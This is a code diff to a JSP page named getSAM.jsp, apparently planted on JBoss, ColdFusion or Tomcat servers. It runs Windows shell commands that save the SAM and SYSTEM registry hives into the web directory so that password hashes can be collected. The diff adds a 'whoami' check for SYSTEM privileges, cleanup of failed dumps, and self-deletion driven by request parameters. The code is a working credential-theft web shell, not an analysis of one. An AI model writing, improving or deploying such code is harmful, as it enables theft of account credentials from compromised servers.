@@ -20,12 +20,13 @@ if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1) // TH
 	
 	if (request.getParameter("del") != null)
 	{
+		//JBoss -- TODO: Remove other "getSAM" references in the server. (CLASS, and JAVA files)
 		if (getSAMdir.contains("getSAM.war"))
 		{
 			//out.println("Deleting..." + getSAMdir+".war");
 			p = Runtime.getRuntime().exec("cmd.exe /C del /F /Q " + getSAMdir);
 		}
-		
+		//Coldfusion
 		else if (getSAMdir.contains("wwwroot"))
 		{
 			//out.println("Deleting..." + getSAMdir + "\\getSAM.jsp");
@@ -35,7 +36,7 @@ if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1) // TH
 			p = Runtime.getRuntime().exec("cmd.exe /C del /F /Q " + getSAMdir + "\\" + request.getParameter("del2"));
 			p = Runtime.getRuntime().exec("cmd.exe /C del /F /Q " + getSAMdir + "\\getSAM.jsp");
 		}
-		
+		//Tomcat
 		else if (getSAMdir.contains("getSAM"))
 		{
 			//out.println("Deleting..." + getSAMdir);
@@ -74,25 +75,48 @@ if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1) // TH
 				isadmin = true;
 			}
 		}
+
+		if(!isadmin)//Last ditch effort...
+		{
+			p = Runtime.getRuntime().exec("cmd.exe /C whoami");
+			os = p.getOutputStream();
+			in = p.getInputStream();
+			dis = new DataInputStream(in);
+			disr = dis.readLine();
+			if( disr.toLowerCase().contains("system"))
+			{
+				isadmin = true;
+			}
+		}
 	
 		if(isadmin)
 		{
 			int i = 8;
 			String key1 = UUID.randomUUID().toString();
+			String key2 = UUID.randomUUID().toString();
 			key1 = key1.substring(0,i);
-			p = Runtime.getRuntime().exec("cmd.exe /c reg save HKLM\\SAM " + getSAMdir + "\\" + key1);
-			os = p.getOutputStream();
-	    	in = p.getInputStream();
-	    	dis = new DataInputStream(in);
-	    	disr = dis.readLine();
-	    	String key2 = UUID.randomUUID().toString();
 	    	key2 = key2.substring(0,i);	
+			p = Runtime.getRuntime().exec("cmd.exe /c reg save HKLM\\SAM " + getSAMdir + "\\" + key1);
 			p = Runtime.getRuntime().exec("cmd.exe /c reg save HKLM\\System " + getSAMdir + "\\" + key2);
-			os = p.getOutputStream();
+			Thread.sleep(500);//Give the server a second...
+			p = Runtime.getRuntime().exec("cmd.exe /c cd " + getSAMdir + " && dir");
 	    	in = p.getInputStream();
 	    	dis = new DataInputStream(in);
-	    	disr = dis.readLine();
-	    	out.println(key1 + "<>" + key2);
+	    	while ( disr != null ) 
+			{
+				if ( disr.contains(" 0 " + key1))
+	    		{
+	    			p = Runtime.getRuntime().exec("cmd.exe /c del /F /Q " + getSAMdir + "\\" + key1);
+	    			p = Runtime.getRuntime().exec("cmd.exe /c del /F /Q " + getSAMdir + "\\" + key2);
+	    			isadmin = false;
+	    			break;
+	    		}
+	    		disr = dis.readLine();
+	    	}
+	    	if(isadmin)
+	    	{
+	    		out.println(key1 + "<>" + key2);
+	    	}
 	    }
 	
 	    else//If a blank page returned clustered should run undeploy command
